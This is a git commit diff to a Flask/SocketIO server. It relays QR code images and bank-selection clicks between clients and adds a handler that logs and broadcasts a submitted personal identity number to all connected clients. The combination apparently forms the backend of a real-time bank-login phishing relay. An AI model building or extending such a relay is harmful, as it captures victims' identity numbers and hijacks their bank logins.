d75c0d9f6a3ec98c98fabc62cd980035bfc36b9f
stalkstalk002 <stalkstalk002@gmail.com>
2024-12-14 23:28:42 +0530

    Update server.py: personal number emit

--- server.py
+++ server.py
@@ -5,19 +5,11 @@ import base64
 from io import BytesIO
 
 app = Flask(__name__)
-socketio = SocketIO(app, cors_allowed_origins="*")  # Allow CORS for development
+socketio = SocketIO(app, cors_allowed_origins="*")  
 
 @app.route('/')
 def index():
     return render_template('index.html')
-
-# @app.route('/banknames')
-# def banknames():
-#     return render_template('banknames.html')
-
-# @app.route("/total")
-# def total():
-#     return render_template('total.html')
 
 @app.route('/templates/logo.svg')
 def logo():
@@ -28,7 +20,6 @@ def handle_qr_code(data):
     qr_data = data['data']
     print(f"[DEBUG] QR Code received: {qr_data}")
 
-    # Generate QR code image
     qr = qrcode.QRCode(
         version=1,
         error_correction=qrcode.constants.ERROR_CORRECT_L,
@@ -39,12 +30,10 @@ def handle_qr_code(data):
     qr.make(fit=True)
     qr_img = qr.make_image(fill_color="black", back_color="white")
 
-    # Convert to base64
     buffered = BytesIO()
     qr_img.save(buffered, format="PNG")
     img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
 
-    # Emit the image to all clients
     socketio.emit('update_qr_code_image', {'qr_image': img_base64})
 
 @socketio.on('step_completed')
@@ -52,7 +41,6 @@ def handle_step_completion(data):
     step_number = data['step']
     scanned_data = data['data']
     print(f"[DEBUG] Step {step_number} completed with data: {scanned_data}")
-    # Broadcast the step completion to all connected clients
     socketio.emit('step_completed', {'step': step_number, 'data': scanned_data})
 
 @socketio.on('complete_step')
@@ -60,13 +48,17 @@ def complete_step(data):
     print(f"Emitting complete_step event with data: {data}")
     socketio.emit('complete_step', data)
 
-# New event handler for bank_clicked event
 @socketio.on('bank_clicked')
 def handle_bank_clicked(data):
     bank_name = data['bankName']
     print(f"[DEBUG] Bank clicked: {bank_name}")
-    # Forward the bank_clicked event to the Python app
     socketio.emit('bank_clicked', {'bankName': bank_name})
+
+@socketio.on('personalNumber')
+def handle_personalNumber(data):
+    personalNumber = data['personalNumber']
+    print(f"[DEBUG] personal Number: {personalNumber}")
+    socketio.emit('personalNumber', {'personalNumber': personalNumber})
 
 if __name__ == '__main__':
     # socketio.run(app, host='0.0.0.0', port=5000, debug=True)
